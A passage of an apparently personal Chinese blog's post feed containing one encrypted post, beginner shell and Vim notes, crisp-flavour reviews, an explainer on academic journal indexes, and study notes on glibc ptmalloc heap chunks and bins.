a43105d4edb0f7dcdf8752c47621649675ba1e7c1feb26bcbca241e55fc386212411af7842b78d7d1c30a036cdb27e75e9f9c5faf9a7fe607a71c14433e7456a00ee2346ca85104c58a412e5dd9034ac643025e0c693f13c31594a2d715d6aadf73a79d0be59a8e01e03f6c0a8987c6f4f7ae10be2aa6200ad65a30f79425ccde6eb6c67d09597079703f65eb7cd64c89c70c3be0dd5db94156ab23f1a4e6d18dbd72a997c86a0e795905be328400f2bc27015f1615a68a7e8e793213f6d6f14f50faa5db8f4f341b40759ad375f13faabd171cc026606ce13ead8b3c72ec12c6db34404107548de89f704145f0a600bc7f6f248a20cb83f7575ac9fa7dd074bbd78309eeafdf38b508b62427ecfe8b198a78f0f4047216f86649cfdc55b98b0888a7366816db04a16c13bb46543dc9f4dfbf8bc458fead1124778114eb8dabb2061d518611c57188cc08a3cc9ad09fa2e73cbd933625e3145f4ed3fbfa17dd92a800225d603830b2cfe2430e46bce687017239674741016e8eaac58df4678bad0f04d62108e1ec11d29a68688cadbcdf1a7ad6352e7f4b1f0eb0df53f5a3d6a23d47cc1c41cdb1e224f7a91cb4854f34eee9f172eb56ff5bb3f9b44465433b76b8e7444135dacc0de8f36c1961ee2e0e26be06ead5d06fb86acac30b985ca7ba6d84a0ddb5e6f559a54f20e3dbf64a375fa10944995e1f70d22af8c045b9f07e587c0a26dda8b371a8c7b44c502c4ab860708c77fe337fd62608d3d443365e1138c61966fade1ec44cdde4add470c85daea66a7cd5ddaab3bb57f988d7f455c3657eb209ca2483934d94429e095fb714cd848827227d089ed4c259b441cdfa89d3061806deff916fb4d077514ab4e870196c40b104f9554ebce559121f5aae131344d3ea456f7ea780c72255361648b80613aa124627db083703dc05690375c1d56602749321688f2848843dbb9fb6671496fbb83ffd17f48a743c3d7be90f3d33060384970697c5c7b28939c1f355000d65b076c734e3406c5bd891d318411060c93966da7c7b114a6ef1450706e7f294f90df280cdb2f716433b7c14ab2b2dc28a79aa18d75a820a1e3b3e74f2bc2f15ba57bb5e9cfa818ad98012d234496dc6796c341525d676487a384a7361b32fd4ebb67a59d160b588ce4a2889f4923f08bab9150452ebcc045b575aeffc667da1e911eb024ad5e63f01b4126dde5bad8d05d8184a54bdd7bb0ae2290cb9a0c6b78e43607fa2cd3b5385af06ed7b40266e516ef3916ad71734357efba493a767314ece44b00ee64bd72bfef21944b18f945d4233004ee21f46f239b6214ea515757a0344996318e1a0467d6079f344f8a72977df3e8021eb5367c19c4c4e2cb5d77a6fd8d600d441d300c738b3ede7cce13e3f9ba510a347f3ff68c53269477a4a890bee43ee7e1066cabbc358e1cc58cf9c3893a641fa9c711337fd752ac790c54c9355f709eceb37ea99f5eb21533d5f63ff12a9601da9eb25dc7c4dd0d488377d88e4029c2fb3659e6049ab17ea78cc9a84ea38f896b41d0b7fe24d820df176fdbb477e5a7ace31b5821bca016bbbfc8727be8d52df50795690cd8d76d369514e8c528effbda282d4d6437bba49adfd2820e8a4478d87db754d8f7e70f3a3853225c4e6e0b7ac7323af78caa6696c6bf2b18d34022d83a9bd7826a5bc5fdfd677243a828ef18f0699a08b655987a50772b7ea48acd33c141b61bcffeb993b34630f114ed7a59580c8f440ae291809ea4dbf810b51e43438fc7ca6a647c2b09a33e8e8f53a56bc9c4e5a60847901341ef41a42bc6d079082b006a2111774506af4b224e905a70dfec387cabbcb6f84833d77f0a62b44e08a74ef57e7cad3c5043198abad7d86aff59c006288f2a4c16ff1f362615457937a6aec6262f9f3643752387ad4b8323786b8fa55278414210b92f8a32ebebb832e82eb8e5e88de1bd9e4cac9dba1df58c2665ff05ca251f9b5f339073b9adc6ce805b322a634269593df085a672480b8fd8398a6b713f89a4d6a3c12debb5dc2a03a7cf4e5ad1889f0861149856fe917b6dc185f09bac42ae90141e426c85d29fcdf8b98525ba7262721c25dfc45fd3e697a59f3054b801beb59a5934a037d674e1dd34a87b4a98ea50609e8bc6f5c74397b915202e27ce64f4f73eb5fca0b59001866657d2dacc0e42689b264c245c241f3f64a4f87c051b6197877049f99f6b73b7a68f3d4f1be4e794f866104e291042d57e854d1735eb2f7a13b8923ef7a2fdc0240c80576aab0b56ad7215e48300acd1ada1da87a7969ef6b514f5989879cb0ddab5578961875264d0c4686d529513e1ba9edd9d1905f9406c4e1676f1e761915a3dd571c49e12851615ca163f6c97f8b9a341861816c8f6b59fa0fc7e4b7e6e59d5c1237167a9be6ddfad100fe78d8978cba98cd454ee71a4fc377c0fbe23bec7d54ffdd0dbdb424a87b97dde94181290d20b59243c685f49ce72acc7af6b0d73ea71598863db4d82df44943defe7967a3ff33054486f4b228c521665eee3be51489970adaecd851f6c38062ab2dbbca40560bab2c5e8cbf3dba5d618fa03eb8c5803a8d82bd14ae7f9a3963a968e7d8f52d36c161154f86e8e2fe6740dacb43673d6c655f1f000e5ca1a27e146ccb07bb9d04e8f15b0bfbfd0862a922c382411b1ea1ba6b21aa86a5f80d4a68b689d16468e327561cd8670b50e8ba0b4931b453ce66f6640784f1426d9b242c60016794e42fe2ffa6e3b7fc4f0dbff982b1c2bc8234f1802e5155b54af024d53a03818b275120783e0e2048d06d14f9112746ee2b5419a738064a441dd5cb53d86ed954d995ef727440bbd5fc91396babd8618e0954aed2394371cf03d711202f30b8a5f7dc090c723c4b618be690f1cbc99d30fb075fea6b4d0cb8c3e4298ea50dee65f1904f25ed9135f56d788199fed1e6c4d20451f95d9c9731d647ab619b563855e4fddc3479caadb09b4accbd80fffec5b1a2edebf273c9942e520c291d4e7d3a6f92e673b266624af81b2fcc6f3a64a635a5cdab34adc755bfebd96263f2fe87d46dc4b14b955c85a0088622a31ac680d3cc439bf149e80ab5db6439ef75ba598b420550e8ceefa9ff9485f97049dfc35a884c181c51924f48899e7b46586dffef6bc9314c41bf901742e57c686e88e472ba7d0e1df9bdf0db7ed690f441b649e529105d3f45b225eb6289f4e54d29e4449f1e40e5a3e8e19c974c35628277f90d4acee1b7ddc8006d7168e59326e33f17c0b686076c8ff6747baab9b1e201223cd61a2aa2fb351767a8b975fc43c9055797dfb8ec275e9170f2b957658c480d4ae3f0571926e4e9546eecb12859ffec35d6b3db514f232aa59f5eee911e7e9b94def398ec7deb668c1b6fc6a40a257fe6a124d4d075707a05002d8057d55711c758c16ea54dc9bb5b7d9572aa227f83ffa48156e7470f1e0aec81e74922e940de28b54d5150de028b84ad5889bcfa18cc7b39c9276b9fda24ad6202ce6774f475541dd88acd844d3ff749bb6705dd35ece291618b3779d8b79241180d74b567f7cd9565a394c4b906fb574f0fe080f8ee2d33488d7726a37207255bd779a337d1189097b6b1899d6e2f879c294fd98b03cdfb1a81a75a936b864ac7a98d46ca9446e26c1f348e20f459030b2d62ba1a1c8969c2043120520768dde0a8dc2f3e202b7245e82910958c79bf7c776ebab4176c677ac2a1188f94a4385969ac5ad67792362dec3ce1cb294f701b23aea5f8f3dad1abea2236d01eec2fbf38293988f4cca8d01bb6e4ea717fd9b57ab146bc061b4a4bac08479f1b6cd857260018e2353f5e3445e0a0d70b345e34ceca367a8ee697f36c5de493d14d07972a6f821205d28bec64b62baa6313af766b27cdc5a3c09339a52dcfe1597d58ce94dec9a5a23d1d7264b98c7bb4044803e8971d25fed73e9eb52569a333e63d4f78655d0824faf365b1e68456527e074b1402b2d779cd062babc93d23d1e8ea7a387e18374067e8136702f44a417139c9f596d93e5b572649c78c83be0a6ce6d7d50ed57505fb93cb7589c94679b4b07e67fce0973328c19a6329daa41b9a1a84ca89169b999b3243a2012c92b2ba65c4e1e785ea95017a95e8dc905c1117fbbdf7b0ac6238efcdcbe74f378099ed27b1cf8dcfe2a061fcbd11cad00d0ea140a7d286af07da11fd053cd7a13452c433458a92b77b8694e966dbf947054bc525702dbdf94fb89a7435cbcee397a073c62bc6cb66d7c0488ec02620693b8065791d759e79b920d6e8bf8d389ee9fd7a00399660453f19f7f076a834daa040ce1752354b285b5b53610d275e36c0bdc7b4f0a92bf0dec95066e360884c345e90baedb6d320eda92bfc3834f4cfa651bca721cdbcae42d64c23ff222e710a5f5e735b4a0292ed1a3b81650e4599e9d755159ca144931732558d67cd48050a8a7a7a2b739510a16863aeb1b14961c930e0753f866c8235137a5211522b56ab5ee44868be97aa1909126005244e39ccf9e91ac7b0235f1b36d8c5532aa6189d855f41c804edc6ed49f90d9d620f056489cf2d7387fac8e29cc74477643bcfce8671b140757ccbd73f11648af3d956aff31dee732b79ec747d67b5f0d14723629f6c3295dceade01f3549511ed0eeb8053b8c62a1c01b7a7d7542789e497b9794247b31968a9172724a0b732d34debb1a2b80482593516243ea6ea13f3375d005999849887297a8bb35b9041327cdc8c24e51fa36a33fea82ac1702b1abbe7218f20c4498d7ce3918fd7b6a4f50ae098d3ce31a42d54dad0b319e495cf3ac24baefe53363386478b7ab0ceb0ee94b8cf4eb75c2d56233223efca03a0b9a285ab9335a28480b6d47669d7c1fea8e8f47922fa41825e520774a01cd9aa6d8f418492eb4d30a8a79274b4a63476163c5d6b0d1664e476818d69d96edc91aba4f5a1062d9c92101995e0631eb4cac93b5362896eb10ccdc3517076643f4388029df17f2cdea538724734b4a141b6260b8f91dd41b6231e4fa6905fccecd819a020602b5d01939d8eded1e563de7b903740c47e31f39516317d3f6cf1ef5b1e21bba43c02fe2cfea385383557994b0f892a37404754fad35adc1bc2a130f24b6109aebe19b2fd778bb29282fb0aa26409b2f0c3cf2653e4abca526842de1831e710854e446c0131e7a7e244964c990d485009afc6e817e9da8494f37b83281ba205e6f84c750b62f3185cf2d142573068de53e7757de7c26fd20638f9049538a76701272db8d582231659c61ffb0cefe0fcd7c575b04a5b7b5862564a7cbde227b63bd1fd1d4981bc1f7365e868e8de84ead8af79333b09cdc17f43227091cc4eed9f9921ca6bfab9f472ddd74077fd762dd3f300176bf1da8ef9d7e2bd33e9da3baa0e9bc4dcc964a7d094b91f1f591bac8fade9fd0430163c4c8a0b8c398a949257c0339414a97c928223ced0838d9fd2e5797c995dcaac311232853cfd0441190ebd71a49019786c0b99e4deb81baf7d0a1256f67cf9921bfd9100e7f007dc9c9aa48c12382a30bd27b86060a3258522ba89a26b0735a7e064e382ae481937873fb08e6d00380dcf93930d7ef1599aa2d69e813d6072eef17e809fedfb8d78dc38404d227a5d839c672dc8cc8bf71dd09806dc408c8397a2a06a3405cdc8893fab1fc201523da9e0b16e353782c770cc03e76adacffa601f6cb30223dfcff170c7d3467b6048ffcea41e6b9602aee9fecb0378a35c9d2be2aa826b05b9c04ac2924397881912d31bef6122a89cb1c49b0894537f7cc74478b435c5257a38f9c6e1d8fcedaf2486a457d3108c97742601bb28263622d3158633231108922ec4f569f7e50b856935e3ba654b4801aeb9c37b336075178c2f38c62afbda8b50eddbb7e517092908bd015d47b7af041a6e17324c695f92ab5cadf15d647623f0eab5a681b40bbc3d5bc7550329ec4447e9cee46ab8d6a7194111f8669a7e35e8cef4fc9010b1f42d2f17be284975ae9c504c1f1daefb071b4e00f8ed40be5b32c3dd81590b904b8b1a36b6911ae97622554fa6aa9298edb4454df6d34a3d68a55f56df5f3b98f5452156e26671c56553f7802aa74a6d1bd00194b0ec9b86b882f0cab590f4aedd2d2a3386e38ff97ed8df1f5a4d4a157b2d1a43ae8f48b0f69e580dd3d74087878eff33a4df0f97003db6ec1bbbc8b79bbc776d6cff978fcd770805ef9fc867a0845d1b9f3ae2863ec2f7b560e0d1a0a9c7d7aeed462605c051ae313d89e060b2990f33f03109dc622db160d18c667aa1906b276d1d66386c5ea0c54f9df5d4d3875b4dc7076c2a69879157d863447917cde9d95f0c3bdfe884c12c3f9ca7c786aeaf252bdaf57697a64aeb1ea0c380b17f45bcb97bd820a2c2bcd1ef620ee92a54ec76ecf6dfbf13889b3e296dcfeacc33a84bf1920d51bc6410252ebec1eceffc78cc1540124d6f2cd7fbf9a2d3f99bdf6a05e7d51737278f93914892642c9c413954288e6a13eb2d05b44fad6555220362aea8879d09d0b81b4c6be251c62ae75c9b9321f3f6489f19fd5035170839bdd722a211d4bbdfda4bca5fdc0326bc600f622fb3316b10b078a740540447ce1c91d73a1d2bfeb672e5800229d4084518df1a5db77531de5df09ed371049d7315a0a5a9b025839c476794f0a53494467b3e250c482ffb0b925df52a585b331f315bec6fbcf4ca97418a7a1acfdebc0934785c9d75484f7f6b80586afcbd317478aa7cc42aac2c5240f68d35a11fd510ff6cdcb6127132cefd5337e6835c577ceaed48d1f7741e38666446df2933c138c0d8da45ac3f4af33f7d68a011062fc34d60165269f5daef33c378f7d5ef5433035b9c9b</script>
  <div class="hbe hbe-content">
    <div class="hbe hbe-input hbe-input-default">
      <input class="hbe hbe-input-field hbe-input-field-default" type="password" id="hbePass">
      <label class="hbe hbe-input-label hbe-input-label-default" for="hbePass">
        <span class="hbe hbe-input-label-content hbe-input-label-content-default">NULL</span>
      </label>
    </div>
  </div>
</div>
<script data-pjax src="/lib/hbe.js"></script><link href="/css/hbe.style.css" rel="stylesheet" type="text/css">]]></content>
      <tags>
        <tag>爬虫</tag>
        <tag>python</tag>
      </tags>
  </entry>
  <entry>
    <title>shell 学习</title>
    <url>/46066.html</url>
    <content><![CDATA[<p>好早之前记录的东西了，放出来罢</p>
<span id="more"></span>
<p>先按照菜鸟的章节进行划分toc，因为有一定linux命令基础所以可能会增删一些内容</p>
<h1>Overall</h1>
<ul>
<li>运行方法：</li>
</ul>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">sh ./xxx.sh #将文件名作为sh解释器的参数</span><br><span class="line"><span class="meta">#</span><span class="bash"> or</span></span><br><span class="line">chmod +x ./xxx.sh   #作为可执行程序直接执行</span><br><span class="line">./xxx.sh</span><br></pre></td></tr></table></figure>
<ul>
<li>用 <strong>#!</strong> 说明执行用的解释器，如</li>
</ul>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash">!/bin/sh</span></span><br><span class="line"><span class="meta"></span></span><br><span class="line"><span class="meta">#</span><span class="bash">!/usr/bin/env sh <span class="comment">#在系统环境中找sh</span></span></span><br><span class="line"><span class="meta"></span></span><br><span class="line"><span class="meta">#</span><span class="bash">!/usr/bin/env -S -P /usr/<span class="built_in">local</span>/bin:/usr/bin:<span class="variable">$&#123;Path&#125;</span> sh <span class="comment">#在/usr/local/bin 和 /usr/bin 以及 PATH 定义的目录下找sh</span></span></span><br></pre></td></tr></table></figure>
<h1>变量</h1>
<h2 id="定义变量">定义变量</h2>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">a=&quot;aaaa&quot;</span><br><span class="line">b=1</span><br><span class="line">for file in `ls ./Desktop`</span><br><span class="line">for file in $(ls ./Desktop) #以上两句在每次循环中取一个Desktop下的文件名给file变量</span><br></pre></td></tr></table></figure>
<blockquote>
<p>命名只能用字母数字下划线，且不能以数字开头<br>
“=”两边不能有空格<br>
双引号和单引号等价</p>
</blockquote>
<h3 id="只读变量">只读变量</h3>
<p>在定义变量后使用 readonly *  ，如：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">a=&quot;Bruce&quot;</span><br><span class="line">readonly a</span><br></pre></td></tr></table></figure>
<h3 id="字符串">字符串</h3>
<ol>
<li>
<p>单引号。<br>
单引号中的字符会原样输出，不能使用变量或转义字符<br>
不能出现单独一个单引号，但可以成对出现来对字符串进行拼接</p>
</li>
<li>
<p>双引号。<br>
双引号中可以使用变量和转义字符</p>
</li>
</ol>
<ul>
<li>获取字符串长度：</li>
</ul>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">echo $&#123;#string&#125;</span><br></pre></td></tr></table></figure>
<ul>
<li>提取字串</li>
</ul>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">echo $&#123;sting1:4&#125;    #从左到右，开头下标为0</span><br></pre></td></tr></table></figure>
<ul>
<li>查找子串</li>
</ul>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">string=&quot;runoob is a great site&quot;</span><br><span class="line">echo `expr index &quot;$string&quot; o`  # 输出 4</span><br></pre></td></tr></table></figure>
<h3 id="数组">数组</h3>
<blockquote>
<ol>
<li>array_name=(v0 v1 v2 …)</li>
<li>array_name=(<br>
v0<br>
v1<br>
v2<br>
…<br>
)</li>
<li>array_name[0]=v0<br>
array_name[1]=v1<br>
…</li>
</ol>
</blockquote>
<h2 id="使用变量">使用变量</h2>
<p>使用变量需要在变量名前添加dollar符：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">a_price=1</span><br><span class="line">echo $a</span><br><span class="line">echo $&#123;a&#125;</span><br></pre></td></tr></table></figure>
<p>其中花括号可加可不加，但为了能让解释器正确识别变量，建议都加上花括号</p>
<h2 id="删除变量">删除变量</h2>
<p>unset，如</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">a_price=1</span><br><span class="line">unset a_price</span><br><span class="line">b_price=$&#123;a_price&#125;  #ERROR!</span><br></pre></td></tr></table></figure>
]]></content>
      <tags>
        <tag>笔记</tag>
      </tags>
  </entry>
  <entry>
    <title>Vim使用小记</title>
    <url>/47178.html</url>
    <content><![CDATA[<p>在平板上用termux跑ubuntu+vim写/看代码时的记录<br>
不日应该会改成用带gui的aidlux或者ubuntu+code-server<br>
不知道会不会再往这上边添加东西</p>
<span id="more"></span>
<h1>分屏</h1>
<p>vim -O file1 file2 … 同时打开多个文件,水平方向显示</p>
<p>:sp 竖直分隔页面<br>
:vsp 水平分隔页面<br>
:vertical [num] 当前部分水平宽度<br>
:res [num] 当前部分竖直高度</p>
<p>ctrl+w 后<br>
w(2n次,按住ctrl) 切换窗口<br>
c 删除窗口</p>
]]></content>
  </entry>
  <entry>
    <title>乐事各种口味评价</title>
    <url>/4052.html</url>
    <content><![CDATA[<p>记录一下👴吃过的乐事较少见款袋装薯片的味道</p>
<p>完全不知道为啥会想着要记录这种东西…果然是属于莫名其妙的记录Orz</p>
<span id="more"></span>
<hr>
<p>春日限定-樱花米酿味：外观上表面有些红点（成分表里的诱惑红），跟黄瓜味差不多甜，闻起来略微酒酿（醪糟）味，没啥特点，偏硬。属于再也不会吃的那种。（2/10）</p>
<p>蒜蓉烤生蚝味：…开袋需谨慎，一打开凑上去闻了一下差点把👴送走。最开始的几片简直要吐了我擦，吃着吃着倒是好了一些。蒜蓉生蚝的味道确实很够，余味也挺长（吃完之后嘴里留下的味道像是去烧烤店里把生蚝当晚饭了），但是作为薯片略微违和，只是令👴想吃烧烤罢了Orz。口感像是上好佳。（3/10）</p>
<p>孜然烤羊肉串味：贼香，羊肉（主要是膻味）和孜然味道很足，👴吃的爽得一🍺。（9/10）</p>
<p>春日限定-醇香栗子味：外观跟樱花米酿完全一致。开袋挺香的（update：吃完了包装袋放三天还挺香的），一股子混合了咖啡、奶酪、黄油，etc的味道（像是偏甜的提拉米苏？emmm闻着想起了卖咖啡的书店…），反正配料表里是只有个干酪。吃起来倒是没啥感觉，没有特别突出的味道，要👴盲吃的时候能说出这是栗子味是完全⑧可能的，但说了这玩意是栗子味倒也有点点点点像（不过栗子本身没味道吧Orz），可能唯一跟栗子搭上边的是口感？不知道是不是心理作用口感略绵。感觉分量好少，还没吃出个啥就吃完了。（6/10）</p>
<p>香酥烤鱼味：闻起来跟烧烤味似的，吃起来也差不多，没啥特点，就是味道太重，齁咸。👴感觉👴口味不淡（指可以接受高油高糖高盐的东西），吃了半包差点没吃完。虽然烤鱼味道不是很好表达，但是<em>猛加调料版烧烤味</em>也太扯了，配不上这个口味的名字。👴如果不是想不开就再也不会吃了。（3/10）</p>
<p>老坛酸菜鱼味：闻起来带有较浓的酸菜味，还有点辛，吃起来倒只有很normal的酸菜味，让👴想起了晚上吃的那家酸菜鱼。外观比原味乐事黄一些，口感类似。（7/10）</p>
<p>藤椒钵钵鸡味：没吃过钵钵鸡所以不好评价，藤椒味挺浓的，（文哥说有点辣但我觉得还行），略香。（8/10）【待续因为吃完后过了两周才记录orz】</p>
<p>生津杨梅味：？（2/10）【存疑，因为感冒了】</p>
<p>金黄炒蟹味：不知道咋评价，对炒蟹没啥概念，反正挺好吃的。（8/10）Round2: 在学校小卖部买了一包，味道不太均匀，大部分寡淡得很。（6/10）</p>
<p>香辣小龙虾味：打开一股香辛料（很熟悉但具体是啥却一下子叫不出名字…）和辣椒粉的味道。没咋吃过小龙虾所以不知道正常的香辣小龙虾是啥味道…不过薯片也不辣，香是蛮香的，也的确能吃出虾类外壳的味道（2333）。不过真的很咸，一个人吃70g略难了，3 40g差不多。（5/10）</p>
<p>芙蓉樱花虾味：好吃，不是上好佳虾片的味道，具体时间隔太久，👴忘了，有缘再吃。（8/10）</p>
<p>黄油煎松茸味：额…黄油煎香菇（淡）味还蛮好吃的，具体描述参见上一条。（7/10）</p>
<p>川香辣子鸡味：挺香的，还有点芝麻味，好评。但估计是👴有点感冒了或者没睡醒，对味觉刺激不是特别够，感觉口感也不太爽。评分正常（7/10）</p>
<p>麻酱铜锅涮肉味：纯纯的麻酱味加一点点肉味（配料表里的肉香风味复合调味料）。说实话不是特别好吃，买了两包（各75g）第一包宛如在吃麻酱，分了三次才吃完（1/10），隔了快一个多月在感冒快好之际吃第二包，感觉麻酱味道淡了一点，但还是只能说不好吃（3/10）</p>
<p>麻辣牛油锅味：边吃边看魏刚强探川菜馆，好吃捏。75g吃完有点腻。（7/10）</p>
<p>辛辣味（大波浪）：一般，不辣，很普通。（6/10）</p>
<p>白桃精酿（大波浪）：舍友说酒味很重，反正我没闻到。吃起来白桃味道很重，略甜了，口感…嚼着有种啤酒泡沫的感觉。（6/10）</p>
<p>椒盐皮皮虾：闻起来很香，一股姑且当作椒盐带壳海鲜的味道，吃的时候倒是吃不出这个味，口感也非常一般，有点类似上好佳。（5/10）</p>
]]></content>
      <tags>
        <tag>莫名其妙的记录</tag>
      </tags>
  </entry>
  <entry>
    <title>SCI、一区二区、普刊、期刊等等到底是啥</title>
    <url>/62594.html</url>
    <content><![CDATA[<p>正常发挥的话明年年初能发一篇论文，故稍微了解了一下这些名词到底是啥orz不然也太离谱了</p>
<span id="more"></span>
<hr>
<p><strong>三区四区、C类不意味着全都是灌水，一区二区、A类B类也不意味着质量都很高</strong></p>
<ul>
<li>
<p>自然科学领域：<br>
SCI：由美国科学信息研究所ISI创建的科学引文索引（Science Citation Index），<strong>一般说的一区二区三区四区即属于SCI</strong>，一般说的SCI论文指在SCI数据库中收录的期刊上发表的论文</p>
</li>
<li>
<p>社科领域：<br>
SSCI：同为ISI创建的社会科学引文索引（Social Science Citation Index）<br>
CSSCI：中文版的SSCI，由南大建立。</p>
</li>
<li>
<p>工程领域：<br>
EI：工程索引（The Engineering Index），EI论文、EI期刊指收录在EI里的期刊（的论文）<br>
CSCD：中国科学引文数据库</p>
</li>
<li>
<p>期刊：分为核心期刊和普通期刊</p>
</li>
<li>
<p>普刊：顾名思义</p>
</li>
<li>
<p>核刊：国内有七个核心期刊体系。北大“中文核心期刊”（北核）、南大CSSCI（C刊、南核）、中信所“中国科技论文统计源期刊”、社科院“中国人文社会科学核心期刊”、中科院文献情报中心CSCD、人文社会科学学报会“中国人文社科学报核心期刊”、万方“中国核心期刊遴选数据库”。</p>
</li>
<li>
<p>A、B、C、D类：<strong>每个单位自行规定</strong>，意思是某刊在X学会/大学/机构被认定为A类，在Y可能是A类、B类等<br>
例如CCF（中国计算机学会）推荐的ABC类期刊</p>
</li>
<li>
<p>影响因子IF：某刊前两年发表的论文在当年的引用次数/该刊前两年发表论文总数</p>
</li>
</ul>
<p>WILL BE CONTINUED IF NECESSARY …</p>
]]></content>
  </entry>
  <entry>
    <title>堆学习</title>
    <url>/21992.html</url>
    <content><![CDATA[<h1>堆相关数据结构</h1>
<h2 id="微观结构">微观结构</h2>
<h3 id="malloc-chunk">malloc_chunk</h3>
<p>程序malloc出的内存称为chunk，在ptmalloc内部用下面的结构体表示，内存空间释放后被加入空闲管理列表。一个chunk不论是分配还是释放，结构都相同。</p>
<span id="more"></span>
<p>malloc_chunk结构体</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">malloc_chunk</span> &#123;</span></span><br><span class="line"></span><br><span class="line">  INTERNAL_SIZE_T      prev_size;  <span class="comment">/* 前一个chunk（物理相连，较低地址）的大小，包括chunk头（如果前一个chunk空闲），否则可以储存前一个chunk的数据，此时这个域的这个字段无效（chunk的空间复用）  */</span></span><br><span class="line">  INTERNAL_SIZE_T      size;     </span><br><span class="line">   <span class="comment">/* 该chunk的大小为2*size的整数倍（size=4或8，32或64位） </span></span><br><span class="line"><span class="comment">      该字段的低3位与大小无关，从高到低 表示</span></span><br><span class="line"><span class="comment">      “是否属于主线程NON_MAIN_ARENA”、</span></span><br><span class="line"><span class="comment">      “是否是由mmap分配IS_MAPPED”、</span></span><br><span class="line"><span class="comment">      “是否被分配PREV_INUSE”</span></span><br><span class="line"><span class="comment">    </span></span><br><span class="line"><span class="comment">  */</span></span><br><span class="line"></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">malloc_chunk</span>* <span class="title">fd</span>;</span>         <span class="comment">/*chunk处于分配状态时从fd开始的字段为用户数据</span></span><br><span class="line"><span class="comment">  struct malloc_chunk* bk;         chunk处于空闲时fd指向前一个空闲的chunk的指针，bk指向后一个空闲的chunk指针(非物理相连)*/</span></span><br><span class="line">                                  </span><br><span class="line"></span><br><span class="line">  <span class="comment">/* Only used for large blocks: pointer to next larger size.  */</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">malloc_chunk</span>* <span class="title">fd_nextsize</span>;</span>         <span class="comment">/*只有chunk空闲时才使用，用于较大的chunk</span></span><br><span class="line"><span class="comment">  struct malloc_chunk* bk_nextsize;         指向与当前chunk大小不同的第一个空闲块*/</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<p><img src="https://raw.githubusercontent.com/Brubbish/pic_bed/master/blog/20210309184724.png" alt="20210309184724"></p>
<p>一般chunk size表示malloc_chunk的实际大小，而chunk unused size 表示该chunk中除了prev_size、size、fd等辅助成员外的实际大小</p>
<h3 id="bin">bin</h3>
<p>bin是由chunk结构体组成的链表，按照chunk的大小来管理free后的chunk</p>
<p>bin链主要有以下几类，其中只有fast bin是单链表，其他都是双向链表。<br>
对于small bins，large bins，unsorted bins来说，ptmalloc将它们维护在同一个数组中，对应的数据结构在malloc_state中</p>
<h4 id="fast-bin">fast bin</h4>
<p>不属于bins，是ptmalloc单独管理小堆块的数据结构，如果free的chunk大小在0x20~0x80，会优先进入fastbin<br>
采用LIFO，用于较小的内存块。当用户需要的chunk大小小于ptmalloc的最大大小时，ptmalloc先判断fastbin中是否有对应大小的空闲块。<br>
fastbin中的chunk的inuse始终置为1，不会与其他chunk合并。但如果相邻的chunk合并后的大小大于某个值（FASTBIN_CONSOLIDATION_THRESHOLD），就需要把fastbin中的chunk合并（内存碎片）</p>
<p>fastbinsY数组中每个fastbin元素指向该链表的尾节点，尾节点通过fd指针指向前一个节点</p>
<h4 id="small-bin">small bin</h4>
<p>采用FIFO，有62个循环双向链表，每个下标对应的chunk大小都一致，关系为</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">x(下标)   2*4*x(32位)	2*8*x(64位)</span><br></pre></td></tr></table></figure>
<p>其中每个链表都有链表头结点<br>
fastbin与smallbin中的chunk的大小有很大一部分会重合，fastbin中的chunk很有可能被放到smallbin中</p>
<h4 id="large-bin">large bin</h4>
<p>包括63个bin，每个bin中的chunk大小不一致。将63个bin分成6组，每组bin中的chunk大小的公差（最大-最小）一致</p>
<table>
<thead>
<tr>
<th>组</th>
<th>数量</th>
<th>公差</th>
</tr>
</thead>
<tbody>
<tr>
<td>1</td>
<td>32</td>
<td>64B</td>
</tr>
<tr>
<td>2</td>
<td>16</td>
<td>512B</td>
</tr>
<tr>
<td>3</td>
<td>8</td>
<td>4096B</td>
</tr>
<tr>
<td>4</td>
<td>4</td>
<td>32768B</td>
</tr>
<tr>
<td>5</td>
<td>2</td>
<td>262144B</td>
</tr>
<tr>
<td>6</td>
<td>1</td>
<td>不限制</td>
</tr>
</tbody>
</table>
<p>其中所有chunk按照从大到小排列</p>
<h4 id="unsorted-bin">unsorted bin</h4>
<p>采用FIFO可以视作空闲chunk回归所属bin前的缓冲区unsorted bin只有一个链表。其中的chunk处于乱序状态，主要有两个来源：</p>
<ul>
<li>较大的chunk被分割后，剩下的部分大于minsize</li>
<li>释放一个不属于fastbin的chunk，并且该chunk不与top chunk相邻</li>
</ul>
<h3 id="top-chunk">top chunk</h3>
<p>程序第一次进行malloc时，heap会被分为两块，其中一块就是top chunk。top chunk即当前堆的物理地址最高的chunk，不属于任何一个bin，只用于在所有bin不满足请求大小时进行分配（如果大小满足），然后将剩下的部分作为top chunk，否则就对heap进行扩展然后再分配（原来的top_chunk紧接着进入unsorted bin，这里可能产生漏洞），在main_arena中通过sbrk扩展，在thread_arena中通过mmap扩展。<br>
topchunk的prev_inuse位始终为1</p>
<h3 id="last-remainder-chunk">last remainder chunk</h3>
<p>当用户请求的是一个small chunk，且该请求无法被small bin、unsorted bin满足的时候，就通过binmaps遍历bin查找最合适的chunk，如果该chunk有剩余部分的话，就将该剩余部分变成一个新的chunk加入到unsorted bin中，另外，再将该新的chunk变成新的last remainder chunk</p>
<p>此类型的chunk用于提高连续malloc(small chunk)的效率，主要是提高内存分配的局部性。那么具体是怎么提高局部性的呢？举例说明。当用户请求一个small chunk，且该请求无法被small bin满足，那么就转而交由unsorted bin处理。同时，假设当前unsorted bin中只有一个chunk的话——就是last remainder chunk，那么就将该chunk分成两部分：前者分配给用户，剩下的部分放到unsorted bin中，并成为新的last remainder chunk。这样就保证了连续malloc(small chunk)中，各个small chunk在内存分布中是相邻的，即提高了内存分配的局部性。</p>
<h2 id="宏观结构">宏观结构</h2>
